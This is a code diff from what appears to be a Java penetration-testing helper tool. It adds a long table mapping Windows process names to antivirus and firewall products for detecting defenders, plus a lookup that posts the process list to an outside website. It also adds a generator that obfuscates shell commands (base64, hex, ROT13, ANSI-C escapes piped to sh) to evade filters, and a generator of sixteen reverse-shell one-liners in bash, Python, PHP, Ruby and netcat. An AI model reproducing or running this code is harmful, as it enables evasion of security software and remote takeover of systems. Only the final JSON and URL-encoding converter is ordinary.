+        String[] data_list = {"360tray.exe|360安全卫士-实时保护","360safe.exe|360安全卫士-主程序","ZhuDongFangYu.exe|360安全卫士-主动防御","360sd.exe|360杀毒","a2guard.exe|a-squared杀毒","ad-watch.exe|Lavasoft杀毒","cleaner8.exe|The Cleaner杀毒","vba32lder.exe|vb32杀毒","MongoosaGUI.exe|Mongoosa杀毒","CorantiControlCenter32.exe|Coranti2012杀毒","F-PROT.exe|F-Prot AntiVirus","CMCTrayIcon.exe|CMC杀毒","K7TSecurity.exe|K7杀毒","UnThreat.exe|UnThreat杀毒","CKSoftShiedAntivirus4.exe|Shield Antivirus杀毒","AVWatchService.exe|VIRUSfighter杀毒","ArcaTasksService.exe|ArcaVir杀毒","iptray.exe|Immunet杀毒","PSafeSysTray.exe|PSafe杀毒","nspupsvc.exe|nProtect杀毒","SpywareTerminatorShield.exe|SpywareTerminator反间谍软件","BKavService.exe|Bkav杀毒","MsMpEng.exe|Microsoft Security Essentials","SBAMSvc.exe|VIPRE","ccSvcHst.exe|Norton杀毒","f-secure.exe|冰岛","avp.exe|Kaspersky","KvMonXP.exe|江民杀毒","RavMonD.exe|瑞星杀毒","Mcshield.exe|McAfee","Tbmon.exe|McAfee","Frameworkservice.exe|McAfee","egui.exe|ESET NOD32","ekrn.exe|ESET NOD32","eguiProxy.exe|ESET NOD32","kxetray.exe|金山毒霸","knsdtray.exe|可牛杀毒","TMBMSRV.exe|趋势杀毒","avcenter.exe|Avira(小红伞)","avguard.exe|Avira(小红伞)","avgnt.exe|Avira(小红伞)","sched.exe|Avira(小红伞)","ashDisp.exe|Avast网络安全","rtvscan.exe|诺顿杀毒","ccapp.exe|SymantecNorton","NPFMntor.exe|Norton杀毒软件","ccSetMgr.exe|赛门铁克","ccRegVfy.exe|Norton杀毒软件","ksafe.exe|金山卫士","QQPCRTP.exe|QQ电脑管家","avgwdsvc.exe|AVG杀毒","QUHLPSVC.exe|QUICK HEAL杀毒","mssecess.exe|微软杀毒","SavProgress.exe|Sophos杀毒","SophosUI.exe|Sophos杀毒","SophosFS.exe|Sophos杀毒","SophosHealth.exe|Sophos杀毒","SophosSafestore64.exe|Sophos杀毒","SophosCleanM.exe|Sophos杀毒","fsavgui.exe|F-Secure杀毒","vsserv.exe|比特梵德","remupd.exe|熊猫卫士","FortiTray.exe|飞塔","safedog.exe|安全狗","parmor.exe|木马克星","Iparmor.exe.exe|木马克星","beikesan.exe|贝壳云安全","KSWebShield.exe|金山网盾","TrojanHunter.exe|木马猎手","GG.exe|巨盾网游安全盾","adam.exe|绿鹰安全精灵","AST.exe|超级巡警","ananwidget.exe|墨者安全专家","AVK.exe|AntiVirusKit","avg.exe|AVG Anti-Virus","spidernt.exe|Dr.web","avgaurd.exe|Avira Antivir","vsmon.exe|Zone Alarm","cpf.exe|Comodo","outpost.exe|Outpost Firewall","rfwmain.exe|瑞星防火墙","kpfwtray.exe|金山网镖","FYFireWall.exe|风云防火墙","MPMon.exe|微点主动防御","pfw.exe|天网防火墙","BaiduSdSvc.exe|百度杀毒-服务进程","BaiduSdTray.exe|百度杀毒-托盘进程","BaiduSd.exe|百度杀毒-主程序","SafeDogGuardCenter.exe|安全狗","safedogupdatecenter.exe|安全狗","safedogguardcenter.exe|安全狗","SafeDogSiteIIS.exe|安全狗","SafeDogTray.exe|安全狗","SafeDogServerUI.exe|安全狗","D_Safe_Manage.exe|D盾","d_manage.exe|D盾","yunsuo_agent_service.exe|云锁","yunsuo_agent_daemon.exe|云锁","HwsPanel.exe|护卫神","hws_ui.exe|护卫神","hws.exe|护卫神","hwsd.exe|护卫神","hipstray.exe|火绒","wsctrl.exe|火绒","usysdiag.exe|火绒","SPHINX.exe|SPHINX防火墙","bddownloader.exe|百度卫士","baiduansvx.exe|百度卫士-主进程","AvastUI.exe|Avast!5主程序","emet_agent.exe|EMET","emet_service.exe|EMET","firesvc.exe|McAfee","firetray.exe|McAfee","hipsvc.exe|McAfee","mfevtps.exe|McAfee","mcafeefire.exe|McAfee","scan32.exe|McAfee","shstat.exe|McAfee","vstskmgr.exe|McAfee","engineserver.exe|McAfee","mfeann.exe|McAfee","mcscript.exe|McAfee","updaterui.exe|McAfee","udaterui.exe|McAfee","naprdmgr.exe|McAfee","cleanup.exe|McAfee","cmdagent.exe|McAfee","frminst.exe|McAfee","mcscript_inuse.exe|McAfee","mctray.exe|McAfee","_avp32.exe|卡巴斯基","_avpcc.exe|卡巴斯基","_avpm.exe|卡巴斯基","aAvgApi.exe|AVG","ackwin32.exe|已知杀软进程,名称暂未收录","alertsvc.exe|Norton AntiVirus","alogserv.exe|McAfee VirusScan","anti-trojan.exe|Anti-Trojan Elite","arr.exe|Application Request Route","atguard.exe|AntiVir","atupdater.exe|已知杀软进程,名称暂未收录","atwatch.exe|Mustek","au.exe|NSIS","aupdate.exe|Symantec","auto-protect.nav80try.exe|已知杀软进程,名称暂未收录","autodown.exe|AntiVirus AutoUpdater","avconsol.exe|McAfee","avgcc32.exe|AVG","avgctrl.exe|AVG","avgemc.exe|AVG","avgrsx.exe|AVG","avgserv.exe|AVG","avgserv9.exe|AVG","avgw.exe|AVG","avkpop.exe|G DATA SOFTWARE AG","avkserv.exe|G DATA SOFTWARE AG","avkservice.exe|G DATA SOFTWARE AG","avkwctl9.exe|G DATA SOFTWARE AG","avltmain.exe|Panda Software Aplication","avnt.exe|H+BEDV Datentechnik GmbH","avp32.exe|Kaspersky Anti-Virus","avpcc.exe| Kaspersky AntiVirus","avpdos32.exe| Kaspersky AntiVirus","avpm.exe| Kaspersky AntiVirus","avptc32.exe| Kaspersky AntiVirus","avpupd.exe| Kaspersky AntiVirus","avsynmgr.exe|McAfee","avwin.exe| H+BEDV","bargains.exe|Exact Advertising SpyWare","beagle.exe|Avast","blackd.exe|BlackICE","blackice.exe|BlackICE","blink.exe|micromedia","blss.exe|CBlaster","bootwarn.exe|Symantec","bpc.exe|Grokster","brasil.exe|Exact Advertising","ccevtmgr.exe|Norton Internet Security","cdp.exe|CyberLink Corp.","cfd.exe|Motive Communications","cfgwiz.exe| Norton AntiVirus","claw95.exe|已知杀软进程,名称暂未收录","claw95cf.exe|已知杀软进程,名称暂未收录","clean.exe|windows流氓软件清理大师","cleaner.exe|windows流氓软件清理大师","cleaner3.exe|windows流氓软件清理大师","cleanpc.exe|windows流氓软件清理大师","cpd.exe|McAfee","ctrl.exe|已知杀软进程,名称暂未收录","cv.exe|已知杀软进程,名称暂未收录","defalert.exe|Symantec","defscangui.exe|Symantec","defwatch.exe|Norton Antivirus","doors.exe|已知杀软进程,名称暂未收录","dpf.exe|已知杀软进程,名称暂未收录","dpps2.exe|PanicWare","dssagent.exe|Broderbund","ecengine.exe|已知杀软进程,名称暂未收录","emsw.exe|Alset Inc","ent.exe|已知杀软进程,名称暂未收录","espwatch.exe|已知杀软进程,名称暂未收录","ethereal.exe|RationalClearCase","exe.avxw.exe|已知杀软进程,名称暂未收录","expert.exe|已知杀软进程,名称暂未收录","f-prot95.exe|已知杀软进程,名称暂未收录","fameh32.exe|F-Secure","fast.exe| FastUsr","fch32.exe|F-Secure","fih32.exe|F-Secure","findviru.exe|F-Secure","firewall.exe|AshampooSoftware","fnrb32.exe|F-Secure","fp-win.exe| F-Prot Antivirus OnDemand","fsaa.exe|F-Secure","fsav.exe|F-Secure","fsav32.exe|F-Secure","fsav530stbyb.exe|F-Secure","fsav530wtbyb.exe|F-Secure","fsav95.exe|F-Secure","fsgk32.exe|F-Secure","fsm32.exe|F-Secure","fsma32.exe|F-Secure","fsmb32.exe|F-Secure","gbmenu.exe|已知杀软进程,名称暂未收录","guard.exe|ewido","guarddog.exe|ewido","htlog.exe|已知杀软进程,名称暂未收录","htpatch.exe|Silicon Integrated Systems Corporation","hwpe.exe|已知杀软进程,名称暂未收录","iamapp.exe|Symantec","iamserv.exe|Symantec","iamstats.exe|Symantec","iedriver.exe| Urlblaze.com","iface.exe|Panda Antivirus Module","infus.exe|Infus Dialer","infwin.exe|Msviewparasite","intdel.exe|Inet Delivery","intren.exe|已知杀软进程,名称暂未收录","jammer.exe|已知杀软进程,名称暂未收录","kavpf.exe|Kapersky","kazza.exe|Kapersky","keenvalue.exe|EUNIVERSE INC","launcher.exe|Intercort Systems","ldpro.exe|已知杀软进程,名称暂未收录","ldscan.exe|Windows Trojans Inspector","localnet.exe|已知杀软进程,名称暂未收录","luall.exe|Symantec","luau.exe|Symantec","lucomserver.exe|Norton","mcagent.exe|McAfee","mcmnhdlr.exe|McAfee","mctool.exe|McAfee","mcupdate.exe|McAfee","mcvsrte.exe|McAfee","mcvsshld.exe|McAfee","mfin32.exe|MyFreeInternetUpdate","mfw2en.exe|MyFreeInternetUpdate","mfweng3.02d30.exe|MyFreeInternetUpdate","mgavrtcl.exe|McAfee","mgavrte.exe|McAfee","mghtml.exe|McAfee","mgui.exe|BullGuard","minilog.exe|Zone Labs Inc","mmod.exe|EzulaInc","mostat.exe|WurldMediaInc","mpfagent.exe|McAfee","mpfservice.exe|McAfee","mpftray.exe|McAfee","mscache.exe|Integrated Search Technologies Spyware","mscman.exe|OdysseusMarketingInc","msmgt.exe|Total Velocity Spyware","msvxd.exe|W32/Datom-A","mwatch.exe|已知杀软进程,名称暂未收录","nav.exe|Reuters Limited","navapsvc.exe|Norton AntiVirus","navapw32.exe|Norton AntiVirus","navw32.exe|Norton Antivirus","ndd32.exe|诺顿磁盘医生","neowatchlog.exe|已知杀软进程,名称暂未收录","netutils.exe|已知杀软进程,名称暂未收录","nisserv.exe|Norton","nisum.exe|Norton","nmain.exe|Norton","nod32.exe|ESET Smart Security","norton_internet_secu_3.0_407.exe|已知杀软进程,名称暂未收录","notstart.exe|已知杀软进程,名称暂未收录","nprotect.exe|Symantec","npscheck.exe|Norton","npssvc.exe|Norton","ntrtscan.exe|趋势反病毒应用程序","nui.exe|已知杀软进程,名称暂未收录","otfix.exe|已知杀软进程,名称暂未收录","outpostinstall.exe|Outpost","patch.exe|趋势科技","pavw.exe|已知杀软进程,名称暂未收录","pcscan.exe|趋势科技","pdsetup.exe|已知杀软进程,名称暂未收录","persfw.exe|Tiny Personal Firewall","pgmonitr.exe|PromulGate SpyWare","pingscan.exe|已知杀软进程,名称暂未收录","platin.exe|已知杀软进程,名称暂未收录","pop3trap.exe|PC-cillin","poproxy.exe|NortonAntiVirus","popscan.exe|已知杀软进程,名称暂未收录","powerscan.exe|Integrated Search Technologies","ppinupdt.exe|已知杀软进程,名称暂未收录","pptbc.exe|已知杀软进程,名称暂未收录","ppvstop.exe|已知杀软进程,名称暂未收录","prizesurfer.exe|Prizesurfer","prmt.exe|OpiStat","prmvr.exe|Adtomi","processmonitor.exe|Sysinternals","proport.exe|已知杀软进程,名称暂未收录","protectx.exe|ProtectX","pspf.exe|已知杀软进程,名称暂未收录","purge.exe|已知杀软进程,名称暂未收录","qconsole.exe|Norton AntiVirus Quarantine Console","qserver.exe|Norton Internet Security","rapapp.exe|BlackICE","rb32.exe|RapidBlaster","rcsync.exe|PrizeSurfer","realmon.exe|Realmon ","rescue.exe|已知杀软进程,名称暂未收录","rescue32.exe|卡巴斯基互联网安全套装","rshell.exe|已知杀软进程,名称暂未收录","rtvscn95.exe|Real-time virus scanner ","rulaunch.exe|McAfee User Interface","run32dll.exe|PAL PC Spy","safeweb.exe|PSafe Tecnologia","sbserv.exe|Norton Antivirus","scrscan.exe|360杀毒","sfc.exe|System file checker","sh.exe|MKS Toolkit for Win3","showbehind.exe|MicroSmarts Enterprise Component ","soap.exe|System Soap Pro","sofi.exe|已知杀软进程,名称暂未收录","sperm.exe|已知杀软进程,名称暂未收录","supporter5.exe|eScorcher反病毒","symproxysvc.exe|Symantec","symtray.exe|Symantec","tbscan.exe|ThunderBYTE","tc.exe|TimeCalende","titanin.exe|TitanHide","tvmd.exe|Total Velocity","tvtmd.exe| Total Velocity","vettray.exe|eTrust","vir-help.exe|已知杀软进程,名称暂未收录","vnpc3000.exe|已知杀软进程,名称暂未收录","vpc32.exe|Symantec","vpc42.exe|Symantec","vshwin32.exe|McAfee","vsmain.exe|McAfee","vsstat.exe|McAfee","wfindv32.exe|已知杀软进程,名称暂未收录","zapro.exe|Zone Alarm","zonealarm.exe|Zone Alarm","AVPM.exe|Kaspersky","A2CMD.exe|Emsisoft Anti-Malware","A2SERVICE.exe|a-squared free","A2FREE.exe|a-squared Free","ADVCHK.exe|Norton AntiVirus","AGB.exe|安天防线","AHPROCMONSERVER.exe|安天防线","AIRDEFENSE.exe|AirDefense","ALERTSVC.exe|Norton AntiVirus","AVIRA.exe|小红伞杀毒","AMON.exe|Tiny Personal Firewall","AVZ.exe|AVZ","ANTIVIR.exe|已知杀软进程,名称暂未收录","APVXDWIN.exe|熊猫卫士","ASHMAISV.exe|Alwil","ASHSERV.exe|Avast Anti-virus","ASHSIMPL.exe|AVAST!VirusCleaner","ASHWEBSV.exe|Avast","ASWUPDSV.exe|Avast","ASWSCAN.exe|Avast","AVCIMAN.exe|熊猫卫士","AVCONSOL.exe|McAfee","AVENGINE.exe|熊猫卫士","AVESVC.exe|Avira AntiVir Security Service","AVEVL32.exe|已知杀软进程,名称暂未收录","AVGAM.exe|AVG","AVGCC.exe|AVG","AVGCHSVX.exe|AVG","AVGCSRVX|AVG","AVGNSX.exe|AVG","AVGCC32.exe|AVG","AVGCTRL.exe|AVG","AVGEMC.exe|AVG","AVGFWSRV.exe|AVG","AVGNTMGR.exe|AVG","AVGSERV.exe|AVG","AVGTRAY.exe|AVG","AVGUPSVC.exe|AVG","AVINITNT.exe|Command AntiVirus for NT Server","AVPCC.exe|Kaspersky","AVSERVER.exe|Kerio MailServer","AVSCHED32.exe|H+BEDV","AVSYNMGR.exe|McAfee","AVWUPSRV.exe|H+BEDV","BDSWITCH.exe|BitDefender Module","BLACKD.exe|BlackICE","CCEVTMGR.exe|Symantec","CFP.exe|COMODO","CLAMWIN.exe|ClamWin Portable","CUREIT.exe|DrWeb CureIT","DEFWATCH.exe|Norton Antivirus","DRWADINS.exe|Dr.Web","DRWEB.exe|Dr.Web","DEFENDERDAEMON.exe|ShadowDefender","EWIDOCTRL.exe|Ewido Security Suite","EZANTIVIRUSREGISTRATIONCHECK.exe|e-Trust Antivirus","FIREWALL.exe|AshampooSoftware","FPROTTRAY.exe|F-PROT Antivirus","FPWIN.exe|Verizon","FRESHCLAM.exe|ClamAV","FSAV32.exe|F-Secure","FSBWSYS.exe|F-secure","FSDFWD.exe|F-Secure","FSGK32.exe|F-Secure","FSGK32ST.exe|F-Secure","FSMA32.exe|F-Secure","FSMB32.exe|F-Secure","FSSM32.exe|F-Secure","GUARDGUI.exe|网游保镖","GUARDNT.exe|IKARUS","IAMAPP.exe|Symantec","INOCIT.exe|eTrust","INORPC.exe|eTrust","INORT.exe|eTrust","INOTASK.exe|eTrust","INOUPTNG.exe|eTrust","ISAFE.exe|eTrust","KAV.exe|Kaspersky","KAVMM.exe|Kaspersky","KAVPF.exe|Kaspersky","KAVPFW.exe|Kaspersky","KAVSTART.exe|Kaspersky","KAVSVC.exe|Kaspersky","KAVSVCUI.exe|Kaspersky","KMAILMON.exe|金山毒霸","MCAGENT.exe|McAfee","MCMNHDLR.exe|McAfee","MCREGWIZ.exe|McAfee","MCUPDATE.exe|McAfee","MCVSSHLD.exe|McAfee","MINILOG.exe|Zone Alarm","MYAGTSVC.exe|McAfee","MYAGTTRY.exe|McAfee","NAVAPSVC.exe|Norton","NAVAPW32.exe|Norton","NAVLU32.exe|Norton","NAVW32.exe|Norton Antivirus","NEOWATCHLOG.exe|NeoWatch","NEOWATCHTRAY.exe|NeoWatch","NISSERV.exe|Norton","NISUM.exe|Norton","NMAIN.exe|Norton","NOD32.exe|ESET NOD32","NPFMSG.exe|Norman个人防火墙","NPROTECT.exe|Symantec","NSMDTR.exe|Norton","NTRTSCAN.exe|趋势科技","OFCPFWSVC.exe|OfficeScanNT","ONLINENT.exe|已知杀软进程,名称暂未收录","OP_MON.exe| OutpostFirewall","PAVFIRES.exe|熊猫卫士","PAVFNSVR.exe|熊猫卫士","PAVKRE.exe|熊猫卫士","PAVPROT.exe|熊猫卫士","PAVPROXY.exe|熊猫卫士","PAVPRSRV.exe|熊猫卫士","PAVSRV51.exe|熊猫卫士","PAVSS.exe|熊猫卫士","PCCGUIDE.exe|PC-cillin","PCCIOMON.exe|PC-cillin","PCCNTMON.exe|PC-cillin","PCCPFW.exe|趋势科技","PCCTLCOM.exe|趋势科技","PCTAV.exe|PC Tools AntiVirus","PERSFW.exe|Tiny Personal Firewall","PERVAC.exe|已知杀软进程,名称暂未收录","PESTPATROL.exe|Ikarus","PREVSRV.exe|熊猫卫士","RTVSCN95.exe|Real-time Virus Scanner","SAVADMINSERVICE.exe|SAV","SAVMAIN.exe|SAV","SAVSCAN.exe|SAV","SDHELP.exe|Spyware Doctor","SHSTAT.exe|McAfee","SPBBCSVC.exe|Symantec","SPIDERCPL.exe|Dr.Web","SPIDERML.exe|Dr.Web","SPIDERUI.exe|Dr.Web","SPYBOTSD.exe|Spybot ","SWAGENT.exe|SonicWALL","SWDOCTOR.exe|SonicWALL","SWNETSUP.exe|Sophos","SYMLCSVC.exe|Symantec","SYMPROXYSVC.exe|Symantec","SYMSPORT.exe|Sysmantec","SYMWSC.exe|Sysmantec","SYNMGR.exe|Sysmantec","TMLISTEN.exe|趋势科技","TMNTSRV.exe|趋势科技","TMPROXY.exe|趋势科技","TNBUTIL.exe|Anti-Virus","VBA32ECM.exe|已知杀软进程,名称暂未收录","VBA32IFS.exe|已知杀软进程,名称暂未收录","VBA32PP3.exe|已知杀软进程,名称暂未收录","VCRMON.exe|VirusChaser","VRMONNT.exe|HAURI","VRMONSVC.exe|HAURI","VSHWIN32.exe|McAfee","VSSTAT.exe|McAfee","XCOMMSVR.exe|BitDefender","ZONEALARM.exe|Zone Alarm","360rp.exe|360杀毒","afwServ.exe| Avast Antivirus","safeboxTray.exe|360杀毒","360safebox.exe|360杀毒","QQPCTray.exe|QQ电脑管家","KSafeTray.exe|金山毒霸","KSafeSvc.exe|金山毒霸","KWatch.exe|金山毒霸","gov_defence_service.exe|云锁","gov_defence_daemon.exe|云锁","smartscreen.exe|Windows Defender","finalshell.exe|finalshell终端管理","navicat.exe|数据库管理","AliSecGuard.exe|阿里云盾","AliYunDunUpdate.exe|阿里云盾","AliYunDun.exe|阿里云盾","CmsGoAgent.windows-amd64.|阿里云监控"};
+        List<String> data_list_2 = new ArrayList<>();
+        Pattern pattern = Pattern.compile("\n.*?\\.exe");//匹配一个或多个字符
+        Matcher matcher = pattern.matcher(tasklist);
+        while(matcher.find())//matcher.find()用于查找是否有这个字符，有的话返回true
+        {
+            //start()返回上一个匹配项的起始索引
+            //end()返回上一个匹配项的末尾索引。
+            data_list_2.add(tasklist.substring(matcher.start(), matcher.end()));
+        }
+
+        for(int i=0;i<data_list_2.size();i++){
+            String temp_data = data_list_2.get(i).substring(1);
+            for(int i1=0;i1 < data_list.length;i1++){
+                String[] temp_data_2 = data_list[i1].split("\\|");
+                if(temp_data.equals(temp_data_2[0])){
+                    data += data_list[i1].replace("|"," =======> ")+"\n";
+                }
+            }
+        }
+
+        return data;
+    }
+
+    //windows在线查询进程
+    private String windows_api_tasklist(String tasklist){
+        String data = "";
+        String temp_data = "";
+        String html_data = "";
+        String temp_tasklist ="";
+        tasklist = "\n"+tasklist;
+        List<String> data_list = new ArrayList<>();
+
+        Pattern pattern_tasklist = Pattern.compile("\n.*?\\.exe");//匹配一个或多个字符
+        Matcher matcher_tasklist = pattern_tasklist.matcher(tasklist);
+        while(matcher_tasklist.find())//matcher.find()用于查找是否有这个字符，有的话返回true
+        {
+            data_list.add(tasklist.substring(matcher_tasklist.start(), matcher_tasklist.end()));
+        }
+        for(int i=0;i<data_list.size();i++){
+            temp_tasklist += data_list.get(i).substring(1)+"+";
+        }
+
+        html_data = sendPost("https://tasklist.pdsec.top/","avlist="+temp_tasklist+"&1=%E5%86%B2%21");
+        if(html_data.equals("发送请求出现异常！")){
+            data = html_data;
+            return data;
+        }
+        Pattern pattern = Pattern.compile("<tbody id=\"tbody\">.*?</tbody>");//匹配一个或多个字符
+        Matcher matcher = pattern.matcher(html_data);
+        while(matcher.find())//matcher.find()用于查找是否有这个字符，有的话返回true
+        {
+            temp_data = html_data.substring(matcher.start(), matcher.end());
+        }
+
+        Pattern pattern_1 = Pattern.compile("<tr><td>.*?</font></td></tr>");//匹配一个或多个字符
+        Matcher matcher_1 = pattern_1.matcher(temp_data);
+        while(matcher_1.find())//matcher.find()用于查找是否有这个字符，有的话返回true
+        {
+            String temp_data_2 = "";
+            temp_data_2 = temp_data.substring(matcher_1.start(), matcher_1.end()).replace("<tr><td>","");
+            temp_data_2 = temp_data_2.replaceAll("</td><td><font color=.*?>"," =======> ");
+            temp_data_2 = temp_data_2.replace("</font></td></tr>","");
+            data +=temp_data_2+"\n";
+        }
+
+        return data;
+    }
+
+    //命令bypass
+    private String[] command_Bypass_get(String command) {
+        // Base64 编码
+        String command_Bypass_1 = "Base64 编码:\n";
+        String base64Encoded = Base64.getEncoder().encodeToString(command.getBytes());
+        command_Bypass_1 += "echo " + base64Encoded + " | base64 --decode | sh";
+        command_Bypass_1 += "\n或者\n`echo " + base64Encoded + " | base64 --decode`";
+
+        // 十六进制编码
+        String command_Bypass_2 ="十六进制编码:\n";
+        StringBuilder hexEncoded = new StringBuilder();
+        for (char c : command.toCharArray()) {
+            hexEncoded.append(String.format("%02x", (int) c));
+        }
+        command_Bypass_2 += "echo " + hexEncoded.toString() + " | xxd -r -p | sh";
+        command_Bypass_2 += "\n或者\n`echo " + hexEncoded.toString() + " | xxd -r -p`";
+
+        // ROT13 编码
+        String command_Bypass_3 = "ROT13 编码:\n";
+        StringBuilder rot13Encoded = new StringBuilder();
+        for (char c : command.toCharArray()) {
+            if (c >= 'a' && c <= 'z') {
+                rot13Encoded.append((char) ('a' + (c - 'a' + 13) % 26));
+            } else if (c >= 'A' && c <= 'Z') {
+                rot13Encoded.append((char) ('A' + (c - 'A' + 13) % 26));
+            } else {
+                rot13Encoded.append(c);
+            }
+        }
+        command_Bypass_3 += "echo " + rot13Encoded.toString() + " | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh";
+        command_Bypass_3 += "\n或者\n`echo " + rot13Encoded.toString() + " | tr 'A-Za-z' 'N-ZA-Mn-za-m'`";
+
+        // ANSI-C 转义字符
+        String command_Bypass_4 = " ANSI-C 转义字符:\n";
+        StringBuilder ansiCEncoded = new StringBuilder("$'");
+        for (char c : command.toCharArray()) {
+            ansiCEncoded.append(String.format("\\x%02x", (int) c));
+        }
+        ansiCEncoded.append("'");
+        command_Bypass_4 += "echo " + ansiCEncoded.toString() + " | sh";
+        command_Bypass_4 += "\n或者\n`echo " + ansiCEncoded.toString() + "`";
+
+        // 返回包含四种混淆命令的数组
+        String[] command_Bypass_list = {command_Bypass_1, command_Bypass_2, command_Bypass_3, command_Bypass_4};
+        return command_Bypass_list;
+    }
+
+    //反弹shell生成
+    private String[] reverse_shell(String ip,String port){
+        //Bash TCP
+        String reverse_shell_1 = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1";
+        String reverse_shell_2 = "/bin/bash -i > /dev/tcp/"+ip+"/"+port+" 0<& 2>&1";
+        String reverse_shell_3 = "exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done";
+        String reverse_shell_4 = "exec /bin/sh 0</dev/tcp/"+ip+"/"+port+" 1>&0 2>&0";
+        String reverse_shell_5 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196";
+
+        //Bash UDP
+        String reverse_shell_6 = "sh -i >& /dev/udp/"+ip+"/"+port+" 0>&1";
+        String reverse_shell_7 = "nc -u -lvp "+port;
+
+        //Python
+        String reverse_shell_8 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
+        String reverse_shell_9 = "export RHOST=\""+ip+"\";export RPORT="+port+";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'";
+        String reverse_shell_10 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'";
+
+        //PHP
+        String reverse_shell_11 = "php -r '$sock=fsockopen(\""+ip+"\","+port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
+        String reverse_shell_12 = "php -r '$s=fsockopen(\""+ip+"\","+port+");$proc=proc_open(\"/bin/sh -i\", array(0=>$s, 1=>$s, 2=>$s),$pipes);'";
+        String reverse_shell_13 = "php -r '$s=fsockopen(\""+ip+"\","+port+");shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
+        String reverse_shell_14 = "php -r '$s=fsockopen(\""+ip+"\","+port+");system(\"/bin/sh -i <&3 >&3 2>&3\");'";
+
+        //Ruby
+        String reverse_shell_15 = "ruby -rsocket -e'f=TCPSocket.open(\""+ip+"\","+port+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
+        String reverse_shell_16 = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+ip+"\",\""+port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";
+
+        String[] reverse_shell_list ={reverse_shell_1,reverse_shell_2,reverse_shell_3,reverse_shell_4,reverse_shell_5,reverse_shell_6,reverse_shell_7,reverse_shell_8,reverse_shell_9,reverse_shell_10,reverse_shell_11,reverse_shell_12,reverse_shell_13,reverse_shell_14,reverse_shell_15,reverse_shell_16};
+        return reverse_shell_list;
+    }
+
+    // 参数/json格式 互转
+    private String convert_data(String stringData) {
+        try {
+            if (isJson(stringData)) {
+                return jsonToUrlEncoded(stringData);
+            } else {
+                return urlEncodedToJson(stringData);
+            }
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+            return "格式错误";
+        }
+    }
+
+    // 简单判断是否为 JSON 格式
+    private boolean isJson(String string) {
+
+        return string.trim().startsWith("{") && string.trim().endsWith("}");
+    }
+
+    // 手动解析 JSON 字符串
+    private String jsonToUrlEncoded(String jsonString) throws UnsupportedEncodingException {
+
+        jsonString = jsonString.trim().substring(1, jsonString.length() - 1); // 去掉大括号
+        StringBuilder urlEncodedString = new StringBuilder();
+        String[] pairs = jsonString.split(",");
+
+        for (String pair : pairs) {
+            String[] keyValue = pair.split(":", 2);
+            String key = keyValue[0].trim().replaceAll("^\"|\"$", ""); // 去掉引号
+            String value = keyValue[1].trim().replaceAll("^\"|\"$", ""); // 去掉引号
+
+            if (urlEncodedString.length() > 0) {
+                urlEncodedString.append("&");
+            }
+            urlEncodedString.append(URLEncoder.encode(key, "UTF-8"))
+                    .append("=")
+                    .append(URLEncoder.encode(value, "UTF-8"));
+        }
+
+        return urlEncodedString.toString();
+    }
+
+    // 手动构建 JSON 字符串
+    private String urlEncodedToJson(String urlEncodedString) throws UnsupportedEncodingException {
+
+        StringBuilder jsonString = new StringBuilder("{");
+        String[] pairs = urlEncodedString.split("&");
+
+        for (int i = 0; i < pairs.length; i++) {
+            String pair = pairs[i];
+            String[] keyValue = pair.split("=", 2);
+            String key = URLDecoder.decode(keyValue[0], "UTF-8");
+            String value = (keyValue.length > 1) ? URLDecoder.decode(keyValue[1], "UTF-8") : "";
+
+            jsonString.append("\"").append(key).append("\":\"").append(value).append("\"");
+            if (i < pairs.length - 1) {
+                jsonString.append(",");
+            }
+        }
+
+        jsonString.append("}");
+        return jsonString.toString();
     }
 
 }
